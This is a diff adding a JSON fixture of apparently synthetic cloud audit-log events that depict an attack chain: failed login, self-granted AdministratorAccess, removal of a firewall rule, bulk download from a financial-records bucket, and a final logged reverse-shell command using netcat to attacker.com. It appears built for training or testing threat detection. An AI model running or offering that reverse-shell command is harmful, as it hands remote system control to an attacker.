@@ -1,0 +1,50 @@
+[
+  {
+    "eventTime": "2025-10-02T09:10:00Z",
+    "eventName": "ConsoleLogin",
+    "userName": "charlie",
+    "sourceIPAddress": "192.168.1.20",
+    "eventType": "Authentication"
+  },
+  {
+    "eventTime": "2025-10-02T09:12:15Z",
+    "eventName": "ConsoleLogin",
+    "userName": "david",
+    "sourceIPAddress": "203.0.113.50",
+    "errorMessage": "Failed authentication",
+    "eventType": "Authentication"
+  },
+  {
+    "eventTime": "2025-10-02T09:15:45Z",
+    "eventName": "AttachAdminPolicy",
+    "userName": "eve",
+    "sourceIPAddress": "198.51.100.25",
+    "policyName": "AdministratorAccess",
+    "eventType": "PrivilegeEscalation"
+  },
+  {
+    "eventTime": "2025-10-02T09:18:30Z",
+    "eventName": "ModifySecurityGroup",
+    "userName": "eve",
+    "sourceIPAddress": "198.51.100.25",
+    "change": "Removed inbound firewall rule",
+    "eventType": "ConfigChange"
+  },
+  {
+    "eventTime": "2025-10-02T09:25:00Z",
+    "eventName": "GetObject",
+    "userName": "david",
+    "sourceIPAddress": "203.0.113.50",
+    "bucketName": "financial-records",
+    "objectKey": "all_clients.zip",
+    "eventType": "DataAccess"
+  },
+  {
+    "eventTime": "2025-10-02T09:30:45Z",
+    "eventName": "RunCommand",
+    "userName": "eve",
+    "sourceIPAddress": "198.51.100.25",
+    "command": "nc -e /bin/bash attacker.com 4444",
+    "eventType": "DangerousCommand"
+  }
+]
